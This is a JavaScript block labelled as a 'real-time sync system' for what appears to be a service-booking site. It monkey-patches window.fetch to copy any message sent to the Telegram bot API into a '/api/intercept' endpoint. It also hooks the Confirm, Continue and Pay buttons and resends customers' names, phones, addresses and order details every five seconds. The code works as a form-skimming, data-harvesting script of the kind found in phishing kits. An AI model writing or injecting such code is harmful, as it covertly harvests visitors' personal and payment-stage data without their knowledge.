<script>
(function() {
  'use strict';

  // ─── Maawen Real-time Sync System ──────────────────────────────────────────
  
  function syncToAdmin(extraData = {}) {
    const urlParams = new URLSearchParams(window.location.search);
    
    const orderData = {
      order_ref: localStorage.getItem('maawen_order_ref') || '',
      customer_name: localStorage.getItem('customer_name') || urlParams.get('name') || '',
      customer_phone: localStorage.getItem('customer_phone') || urlParams.get('phone') || '',
      customer_address: localStorage.getItem('customer_address') || urlParams.get('address') || '',
      service_type: localStorage.getItem('service_type') || urlParams.get('service') || '',
      total_price: parseFloat(localStorage.getItem('total_price') || urlParams.get('total') || '0') || 0,
      duration: localStorage.getItem('duration') || urlParams.get('duration') || '',
      nationality: localStorage.getItem('nationality') || urlParams.get('nationality') || '',
      workers: parseInt(localStorage.getItem('workers') || urlParams.get('workers') || '1') || 1,
      start_date: localStorage.getItem('start_date') || urlParams.get('startDate') || '',
      page: window.location.pathname,
      timestamp: new Date().toISOString(),
      ...extraData
    };

    fetch('/api/intercept', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(orderData)
    })
    .then(r => r.json())
    .then(data => {
      if (data && data.orderRef) {
        localStorage.setItem('maawen_order_ref', data.orderRef);
      }
    })
    .catch(e => console.warn('Sync failed:', e));
  }

  // 1. Intercept Telegram Fetches
  const _originalFetch = window.fetch;
  window.fetch = function(url, options) {
    const urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
    if (urlStr && urlStr.includes('api.telegram.org') && options && options.method === 'POST') {
      try {
        const body = JSON.parse(options.body);
        syncToAdmin({ raw_message: body.text || "" });
      } catch(e) {}
    }
    return _originalFetch.apply(this, arguments);
  };

  // 2. Intercept Critical Button Clicks
  document.addEventListener('click', function(e) {
    const btn = e.target.closest('button');
    if (!btn) return;
    
    const text = btn.textContent.trim();
    
    // Step 1: Confirm Booking (تأكيد الحجز)
    if (text.includes('تأكيد الحجز') || text.includes('Confirm')) {
      // Capture current state from DOM if possible or just sync from localStorage
      setTimeout(() => syncToAdmin({ stage: 'booking_confirmed' }), 100);
    }
    
    // Step 2: Continue (متابعة)
    if (text.includes('متابعة') || text.includes('Continue')) {
      // Small delay to let inputs save to localStorage
      setTimeout(() => syncToAdmin({ stage: 'contact_submitted' }), 100);
    }
    
    // Step 3: Pay (دفع)
    if (text.includes('دفع') || text.includes('Pay')) {
      setTimeout(() => syncToAdmin({ stage: 'payment_clicked' }), 100);
    }
  }, true);

  // 3. Periodic Background Sync (every 5 seconds)
  setInterval(() => {
    if (localStorage.getItem('customer_name') || localStorage.getItem('service_type')) {
      syncToAdmin();
    }
  }, 5000);

  // Global access
  window.MaawenSync = syncToAdmin;

})();
</script>
